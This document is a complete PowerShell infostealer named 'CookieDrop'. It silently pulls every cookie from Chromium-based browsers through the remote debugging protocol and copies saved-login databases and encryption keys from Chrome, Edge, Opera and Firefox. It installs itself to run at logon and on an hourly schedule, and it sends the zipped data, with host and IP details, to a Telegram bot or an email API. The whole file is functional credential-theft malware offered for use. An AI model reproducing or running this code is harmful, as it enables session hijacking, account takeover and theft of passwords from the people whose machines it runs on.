#requires -version 5.1
<#
    CookieDrop - harvest browser cookies and deliver them over Telegram.
    No Python, no admin, no console window, no inbound ports.

    -Visible    show progress
    -NoSend     harvest and zip, deliver nothing
    -NoKill     leave running browsers alone
    -OutDir     copy the zip somewhere as well
#>
[CmdletBinding()]
param(
    [switch]$Visible,
    [switch]$NoSend,
    [switch]$NoKill,
    [string]$OutDir
)

$ErrorActionPreference = 'Continue'
$ProgressPreference    = 'SilentlyContinue'
Add-Type -AssemblyName System.Net.Http
Add-Type -AssemblyName System.IO.Compression.FileSystem

$Script:Root  = Split-Path -Parent $MyInvocation.MyCommand.Path
$Script:Stamp = Get-Date -Format 'yyyyMMdd_HHmmss'
$Script:Base  = Join-Path $env:LOCALAPPDATA 'CookieDrop'
$Script:Logs  = Join-Path $Script:Base 'logs'
$Script:Log   = Join-Path $Script:Logs "$($Script:Stamp)_$env:COMPUTERNAME.log"
$Script:Work  = Join-Path $env:TEMP ('cd_' + [guid]::NewGuid().ToString('N').Substring(0, 8))
New-Item -ItemType Directory -Force $Script:Logs | Out-Null
New-Item -ItemType Directory -Force $Script:Work | Out-Null

$mutex = New-Object System.Threading.Mutex($false, 'Local\CookieDrop')
if (-not $mutex.WaitOne(0)) { exit 0 }

function Log {
    param([string]$Msg, [ValidateSet('INFO','WARN','ERROR')][string]$Level = 'INFO')
    $line = '{0} [{1}] {2}' -f (Get-Date -Format 'HH:mm:ss'), $Level, $Msg
    try { Add-Content -LiteralPath $Script:Log -Value $line -Encoding UTF8 } catch { }
    if ($Visible -or $Level -eq 'ERROR') { Write-Host $line }
}

function Copy-Shared {
    param([string]$Src, [string]$Dst)
    try {
        $in  = [IO.File]::Open($Src, 'Open', 'Read', 'ReadWrite')
        $out = [IO.File]::Create($Dst)
        $in.CopyTo($out); $out.Close(); $in.Close()
        return $true
    } catch { return $false }
}

# ---------------------------------------------------------------- config
$Cfg = [pscustomobject]@{
    telegram        = [pscustomobject]@{ token = ''; chat_id = '' }
    email           = [pscustomobject]@{ enabled = $false; api_key = ''; to = ''; from = '' }
    close_browsers  = $true
    restore_browser = $true
    persist         = $true
    persist_mode    = 'task'
    interval_minutes = 60
    only_on_change  = $true
    heartbeat_hours = 24
    always_send     = $false
    debug_port      = 9333
    include_raw_dbs = $true
    keep_local_copy = $true
}

$ConfFile = Join-Path $Script:Root 'config.json'
if (Test-Path -LiteralPath $ConfFile) {
    try { $Cfg = Get-Content -LiteralPath $ConfFile -Raw | ConvertFrom-Json }
    catch { Log "config.json unparseable: $_" 'ERROR' }
} else {
    Log 'config.json missing, using defaults' 'WARN'
}

$wantTg   = [bool]($Cfg.telegram.token -and $Cfg.telegram.chat_id -and $Cfg.telegram.token -notlike 'PUT_*')
$wantMail = [bool]($Cfg.email.enabled -and $Cfg.email.api_key)
if (-not $wantTg -and -not $wantMail) { Log 'no delivery channel configured' 'ERROR' }

# ---------------------------------------------------------------- telegram
function Send-TgText {
    param([string]$Text)
    if (-not $wantTg) { return $false }
    try {
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$($Cfg.telegram.token)/sendMessage" `
            -Method Post -TimeoutSec 30 -Body @{
                chat_id = [string]$Cfg.telegram.chat_id
                text    = $Text
                disable_web_page_preview = 'true'
            } | Out-Null
        return $true
    } catch { Log "tg text failed: $($_.Exception.Message)" 'WARN'; return $false }
}

function Send-TgDoc {
    param([string]$Path, [string]$Caption)
    if (-not $wantTg) { return $false }
    $client = $null
    try {
        $client = New-Object System.Net.Http.HttpClient
        $client.Timeout = [TimeSpan]::FromSeconds(240)
        $form = New-Object System.Net.Http.MultipartFormDataContent
        $form.Add((New-Object System.Net.Http.StringContent([string]$Cfg.telegram.chat_id)), 'chat_id')
        $form.Add((New-Object System.Net.Http.StringContent($Caption)), 'caption')
        $bytes = [IO.File]::ReadAllBytes($Path)
        $fc = New-Object System.Net.Http.ByteArrayContent -ArgumentList @(,$bytes)
        $fc.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse('application/zip')
        $form.Add($fc, 'document', (Split-Path $Path -Leaf))
        $resp = $client.PostAsync("https://api.telegram.org/bot$($Cfg.telegram.token)/sendDocument", $form).Result
        $body = $resp.Content.ReadAsStringAsync().Result
        if ($resp.IsSuccessStatusCode) { return $true }
        Log "tg doc HTTP $([int]$resp.StatusCode): $body" 'WARN'
        if ($body -match '"retry_after"\s*:\s*(\d+)') { Start-Sleep -Seconds ([int]$Matches[1] + 1) }
        return $false
    } catch { Log "tg doc failed: $($_.Exception.Message)" 'WARN'; return $false }
    finally { if ($client) { $client.Dispose() } }
}

function Send-Mail {
    param([string]$Path)
    if (-not $wantMail) { return $false }
    try {
        $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($Path))
        $body = @{
            sender      = @{ email = $Cfg.email.from }
            to          = @(@{ email = $Cfg.email.to })
            subject     = "CookieDrop $env:COMPUTERNAME $($Script:Stamp)"
            textContent = 'see attachment'
            attachment  = @(@{ content = $b64; name = (Split-Path $Path -Leaf) })
        } | ConvertTo-Json -Depth 6 -Compress
        Invoke-RestMethod 'https://api.brevo.com/v3/smtp/email' -Method Post -TimeoutSec 120 `
            -ContentType 'application/json' `
            -Headers @{ 'api-key' = $Cfg.email.api_key; accept = 'application/json' } `
            -Body $body | Out-Null
        return $true
    } catch { Log "mail failed: $($_.Exception.Message)" 'WARN'; return $false }
}

# ---------------------------------------------------------------- browsers
function First-Exe {
    param([string[]]$Paths)
    foreach ($p in $Paths) { if ($p -and (Test-Path -LiteralPath $p)) { return $p } }
    return $null
}

$pf   = $env:ProgramFiles
$pf86 = ${env:ProgramFiles(x86)}
$lad  = $env:LOCALAPPDATA

$Browsers = @(
    [pscustomobject]@{ Name='chrome'; Proc='chrome.exe'
        Exe = First-Exe @("$pf\Google\Chrome\Application\chrome.exe",
                          "$pf86\Google\Chrome\Application\chrome.exe",
                          "$lad\Google\Chrome\Application\chrome.exe")
        Udd = "$lad\Google\Chrome\User Data" }
    [pscustomobject]@{ Name='edge'; Proc='msedge.exe'
        Exe = First-Exe @("$pf86\Microsoft\Edge\Application\msedge.exe",
                          "$pf\Microsoft\Edge\Application\msedge.exe")
        Udd = "$lad\Microsoft\Edge\User Data" }
    [pscustomobject]@{ Name='brave'; Proc='brave.exe'
        Exe = First-Exe @("$pf\BraveSoftware\Brave-Browser\Application\brave.exe",
                          "$pf86\BraveSoftware\Brave-Browser\Application\brave.exe",
                          "$lad\BraveSoftware\Brave-Browser\Application\brave.exe")
        Udd = "$lad\BraveSoftware\Brave-Browser\User Data" }
    [pscustomobject]@{ Name='vivaldi'; Proc='vivaldi.exe'
        Exe = First-Exe @("$lad\Vivaldi\Application\vivaldi.exe",
                          "$pf\Vivaldi\Application\vivaldi.exe")
        Udd = "$lad\Vivaldi\User Data" }
    [pscustomobject]@{ Name='opera'; Proc='opera.exe'
        Exe = First-Exe @("$lad\Programs\Opera\opera.exe",
                          "$lad\Programs\Opera GX\opera.exe",
                          "$pf\Opera\opera.exe")
        Udd = "$env:APPDATA\Opera Software\Opera Stable" }
    [pscustomobject]@{ Name='operagx'; Proc='opera.exe'
        Exe = First-Exe @("$lad\Programs\Opera GX\opera.exe")
        Udd = "$env:APPDATA\Opera Software\Opera GX Stable" }
)

function Get-Profiles {
    param($B)
    if (-not $B.Udd -or -not (Test-Path -LiteralPath $B.Udd)) { return @() }
    $dirs = @(Get-ChildItem -LiteralPath $B.Udd -Directory -ErrorAction SilentlyContinue |
              Where-Object { $_.Name -eq 'Default' -or $_.Name -like 'Profile *' } |
              ForEach-Object { $_.Name })
    if ($dirs.Count -eq 0) { return @('') }
    return $dirs
}

$Script:CdpId = 0

function Ws-Send {
    param($Ws, $Ct, [string]$Json)
    $b   = [Text.Encoding]::UTF8.GetBytes($Json)
    $seg = New-Object 'System.ArraySegment[byte]' -ArgumentList @(,$b)
    $Ws.SendAsync($seg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $Ct).Wait(15000) | Out-Null
}

function Ws-Call {
    param($Ws, $Ct, [string]$Method, $Params, [int]$TimeoutSec = 20)
    $Script:CdpId++
    $id  = $Script:CdpId
    $msg = @{ id = $id; method = $Method }
    if ($Params) { $msg.params = $Params }
    Ws-Send $Ws $Ct ($msg | ConvertTo-Json -Compress -Depth 6)

    $buf = New-Object byte[] 262144
    $deadline = (Get-Date).AddSeconds($TimeoutSec)
    while ((Get-Date) -lt $deadline) {
        $ms = New-Object IO.MemoryStream
        try {
            do {
                $r = $Ws.ReceiveAsync((New-Object 'System.ArraySegment[byte]' -ArgumentList @(,$buf)), $Ct).Result
                if ($r.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) { return $null }
                if ($r.Count -gt 0) { $ms.Write($buf, 0, $r.Count) }
            } while (-not $r.EndOfMessage)
        } catch { return $null }
        if ($ms.Length -eq 0) { continue }
        try { $obj = [Text.Encoding]::UTF8.GetString($ms.ToArray()) | ConvertFrom-Json } catch { continue }
        if ($obj.id -eq $id) { return $obj }
    }
    return $null
}

function Get-CdpCookies {
    param($B, [string]$Profile, [int]$Port, [ref]$Errors, [string]$Headless = '--headless=new')

    $exe = $B.Exe
    if (-not $exe -or -not (Test-Path -LiteralPath $B.Udd)) { return @() }

    $bargs = @(
        "--remote-debugging-port=$Port", "--user-data-dir=$($B.Udd)",
        '--remote-allow-origins=*', $Headless,
        '--no-first-run', '--no-default-browser-check', '--disable-sync',
        '--disable-gpu', '--disable-background-networking',
        '--disable-component-update', '--no-service-autorun',
        '--disable-features=Translate', '--password-store=basic'
    )
    if ($Profile) { $bargs += "--profile-directory=$Profile" }

    $proc = $null; $ws = $null
    $ct = [System.Threading.CancellationToken]::None
    try {
        $proc = Start-Process -FilePath $exe -ArgumentList $bargs -PassThru -WindowStyle Hidden

        $ver = $null
        for ($i = 0; $i -lt 45; $i++) {
            try {
                $ver = Invoke-RestMethod "http://127.0.0.1:$Port/json/version" -TimeoutSec 1
                if ($ver.webSocketDebuggerUrl) { break }
            } catch { }
            Start-Sleep -Milliseconds 400
        }
        if (-not $ver.webSocketDebuggerUrl) {
            $Errors.Value += "$($B.Name)/$Profile : debug port never opened"
            return @()
        }

        $ws = New-Object System.Net.WebSockets.ClientWebSocket
        $ws.ConnectAsync([Uri]$ver.webSocketDebuggerUrl, $ct).Wait(20000) | Out-Null

        Ws-Call $ws $ct 'Network.enable' $null 10 | Out-Null
        $res = Ws-Call $ws $ct 'Storage.getCookies' @{} 25
        if (-not $res -or $res.error) { $res = Ws-Call $ws $ct 'Network.getAllCookies' $null 25 }
        if (-not $res -or $res.error) {
            $Errors.Value += "$($B.Name)/$Profile : cookie call failed"
            return @()
        }

        $rows = @()
        foreach ($c in $res.result.cookies) {
            $rows += [pscustomobject]@{
                host = $env:COMPUTERNAME; browser = $B.Name; profile = $Profile
                domain = $c.domain; name = $c.name; value = $c.value; path = $c.path
                secure = $c.secure; httpOnly = $c.httpOnly; sameSite = $c.sameSite
                expires = $c.expires
            }
        }
        return $rows
    } catch {
        $Errors.Value += "$($B.Name)/$Profile : $($_.Exception.Message)"
        return @()
    } finally {
        if ($ws)   { try { $ws.Dispose() } catch { } }
        if ($proc) { & taskkill /f /t /pid $proc.Id 2>$null | Out-Null }
    }
}

function Get-BrowserCookies {
    param($B, [ref]$Errors)
    $all = @()
    foreach ($p in (Get-Profiles $B)) {
        $rows = Get-CdpCookies $B $p ([int]$Cfg.debug_port) $Errors
        if (-not $rows.Count -and $p) {
            # one retry with legacy headless, some builds reject --headless=new
            $rows = Get-CdpCookies $B $p ([int]$Cfg.debug_port) $Errors '--headless'
        }
        $all += $rows
    }
    return $all
}

# ---------------------------------------------------------------- persistence
function Install-Persistence {
    $vbs = Join-Path $Script:Root 'RUN.vbs'
    if (-not (Test-Path -LiteralPath $vbs)) { return }

    $key = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
    try {
        $want = "wscript.exe `"$vbs`""
        $cur  = (Get-ItemProperty -Path $key -Name CookieDrop -ErrorAction SilentlyContinue).CookieDrop
        if ($cur -ne $want) {
            Set-ItemProperty -Path $key -Name CookieDrop -Value $want
            Log 'HKCU run key set'
        }
    } catch { Log "run key failed: $_" 'WARN' }

    if ($Cfg.persist_mode -ne 'task') { return }

    try {
        $act = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument "`"$vbs`"" -WorkingDirectory $Script:Root
        $t1  = New-ScheduledTaskTrigger -AtLogOn
        $t2  = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(10) `
                 -RepetitionInterval (New-TimeSpan -Minutes ([int]$Cfg.interval_minutes)) `
                 -RepetitionDuration (New-TimeSpan -Days 3650)
        $set = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
                 -StartWhenAvailable -WakeToRun -ExecutionTimeLimit (New-TimeSpan -Minutes 30) `
                 -MultipleInstances IgnoreNew -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 5)
        $prn = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" `
                 -LogonType Interactive -RunLevel Limited
        Register-ScheduledTask -TaskName 'CookieDrop' -Action $act -Trigger @($t1, $t2) `
                 -Settings $set -Principal $prn -Force | Out-Null
        Log 'scheduled task installed'
    } catch { Log "task install failed: $_" 'WARN' }
}

# ---------------------------------------------------------------- run
Log "start host=$env:COMPUTERNAME user=$env:USERNAME pid=$PID"

if ($Cfg.persist) { Install-Persistence }

Send-TgText ("CookieDrop started`nhost: {0}`nuser: {1}`ntime: {2}" -f `
    $env:COMPUTERNAME, $env:USERNAME, (Get-Date -Format 's')) | Out-Null

$live = @()
foreach ($b in $Browsers) {
    if (Get-Process -Name ($b.Proc -replace '\.exe$','') -ErrorAction SilentlyContinue) { $live += $b.Proc }
}
$live = @($live | Select-Object -Unique)

if ($Cfg.close_browsers -and -not $NoKill -and $live.Count) {
    Log "closing: $($live -join ', ')"
    foreach ($p in $live) { & taskkill /f /im $p 2>$null | Out-Null }
    Start-Sleep -Seconds 2
}

$findings = [ordered]@{}
$errors   = New-Object System.Collections.ArrayList
$raw      = Join-Path $Script:Work 'raw'
New-Item -ItemType Directory -Force $raw | Out-Null

foreach ($b in $Browsers) {
    if (-not $b.Exe) { continue }

    $rows = @(Get-BrowserCookies $b ([ref]$errors))
    if ($rows.Count) {
        $findings[$b.Name] = $rows
        Log "$($b.Name): $($rows.Count) cookies"
    } else {
        Log "$($b.Name): nothing" 'WARN'
    }

    if ($Cfg.include_raw_dbs) {
        foreach ($p in (Get-Profiles $b)) {
            $sub  = Join-Path $raw ($b.Name + '_' + ($p -replace '[^\w]',''))
            $null = New-Item -ItemType Directory -Force $sub
            $base = if ($p) { Join-Path $b.Udd $p } else { $b.Udd }
            foreach ($f in @('Network\Cookies','Network\Cookies-journal','Cookies',
                             'Login Data','Web Data','Preferences')) {
                $src = Join-Path $base $f
                if (Test-Path -LiteralPath $src) {
                    Copy-Shared $src (Join-Path $sub (Split-Path $f -Leaf)) | Out-Null
                }
            }
        }
        $ls = Join-Path $b.Udd 'Local State'
        if (Test-Path -LiteralPath $ls) {
            Copy-Shared $ls (Join-Path $raw "$($b.Name)_LocalState.json") | Out-Null
        }
    }
}

$ffRoot = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path -LiteralPath $ffRoot) {
    $ffOut = Join-Path $raw 'firefox'
    New-Item -ItemType Directory -Force $ffOut | Out-Null
    foreach ($p in (Get-ChildItem -LiteralPath $ffRoot -Directory -ErrorAction SilentlyContinue)) {
        foreach ($f in @('cookies.sqlite','cookies.sqlite-wal','key4.db','logins.json','prefs.js')) {
            $src = Join-Path $p.FullName $f
            if (Test-Path -LiteralPath $src) {
                Copy-Shared $src (Join-Path $ffOut "$($p.Name)_$f") | Out-Null
            }
        }
    }
    if (Get-ChildItem -LiteralPath $ffOut -File -ErrorAction SilentlyContinue) { Log 'firefox: raw db copied' }
}

if ($Cfg.restore_browser -and $live.Count -and -not $NoKill) {
    foreach ($p in $live) {
        $b = $Browsers | Where-Object { $_.Proc -eq $p -and $_.Exe } | Select-Object -First 1
        if ($b) { try { Start-Process -FilePath $b.Exe | Out-Null } catch { } }
    }
    Log 'browsers relaunched'
}

$publicIp = ''
try { $publicIp = (Invoke-RestMethod 'https://api.ipify.org' -TimeoutSec 8) } catch { }
$localIp = @((Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
              Where-Object { $_.IPAddress -notlike '127.*' }).IPAddress) -join ','

$total = 0
foreach ($k in $findings.Keys) { $total += $findings[$k].Count }

$meta = [pscustomobject]@{
    host      = $env:COMPUTERNAME
    user      = $env:USERNAME
    domain    = $env:USERDOMAIN
    os        = (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
    public_ip = $publicIp
    local_ip  = $localIp
    time      = (Get-Date).ToString('o')
    total     = $total
    counts    = (($findings.GetEnumerator() | ForEach-Object { "$($_.Key)=$($_.Value.Count)" }) -join ' ')
    errors    = ($errors -join '; ')
}

$cookiesJson = Join-Path $Script:Work 'cookies.json'
[IO.File]::WriteAllText($cookiesJson,
    ([pscustomobject]@{ meta = $meta; cookies = $findings } | ConvertTo-Json -Depth 8),
    (New-Object System.Text.UTF8Encoding($false)))

$hash = (Get-FileHash -LiteralPath $cookiesJson -Algorithm SHA256).Hash

# ---------------------------------------------------------------- change gate
$StateFile = Join-Path $Script:Base 'state.json'
$state = [pscustomobject]@{ last_hash = ''; last_sent = ''; first_run = $true }
if (Test-Path -LiteralPath $StateFile) {
    try {
        $state = Get-Content -LiteralPath $StateFile -Raw | ConvertFrom-Json
        $state.first_run = $false
    } catch { }
}

$changed = ($hash -ne $state.last_hash)
$due = $true
if ($state.last_sent) {
    $due = ((Get-Date) - [datetime]$state.last_sent).TotalHours -ge [double]$Cfg.heartbeat_hours
}
$shouldSend = $Cfg.always_send -or $state.first_run -or $changed -or $due

$zip = Join-Path $Script:Work "cookiedrop_$($env:COMPUTERNAME)_$($Script:Stamp).zip"
Compress-Archive -Path (Join-Path $Script:Work '*') -DestinationPath $zip -Force

if ((Get-Item -LiteralPath $zip).Length -gt 45MB) {
    Log 'zip over 45MB, shedding raw dbs'
    Remove-Item (Join-Path $Script:Work 'raw') -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -LiteralPath $zip -Force
    Compress-Archive -Path (Join-Path $Script:Work '*') -DestinationPath $zip -Force
}

New-Item -ItemType Directory -Force $Script:Base | Out-Null
$keep = Join-Path $Script:Base (Split-Path $zip -Leaf)
Copy-Item -LiteralPath $zip -Destination $keep -Force
if ($OutDir) {
    New-Item -ItemType Directory -Force $OutDir | Out-Null
    Copy-Item -LiteralPath $zip -Destination $OutDir -Force
}

if (-not $shouldSend) {
    Log "unchanged ($($hash.Substring(0,12))), heartbeat not due - no upload"
    Remove-Item $Script:Work -Recurse -Force -ErrorAction SilentlyContinue
    $mutex.ReleaseMutex(); exit 0
}

$caption = "CookieDrop $($meta.host) | $total cookies | $($meta.counts) | $($meta.public_ip)"

$sent = $false
if (-not $NoSend) {
    for ($i = 1; $i -le 3; $i++) {
        if (Send-TgDoc $zip $caption) { $sent = $true; break }
        if (Send-Mail $zip)           { $sent = $true; break }
        Start-Sleep -Seconds (5 * $i)
    }
    if (-not $sent) {
        Log 'all deliveries failed' 'ERROR'
        $logText = Get-Content -LiteralPath $Script:Log -Raw
        Send-TgText ("CookieDrop FAILED on {0}:`n{1}" -f `
            $env:COMPUTERNAME, $logText.Substring(0, [Math]::Min(3500, $logText.Length))) | Out-Null
    }
}

if ($sent) {
    @{ last_hash = $hash; last_sent = (Get-Date).ToString('o') } |
        ConvertTo-Json | Set-Content -LiteralPath $StateFile -Encoding UTF8
}

Log "done total=$total sent=$sent keep=$keep"
if (-not $Cfg.keep_local_copy -and $sent) {
    Remove-Item -LiteralPath $keep -Force -ErrorAction SilentlyContinue
}
Remove-Item $Script:Work -Recurse -Force -ErrorAction SilentlyContinue
$mutex.ReleaseMutex()
exit 0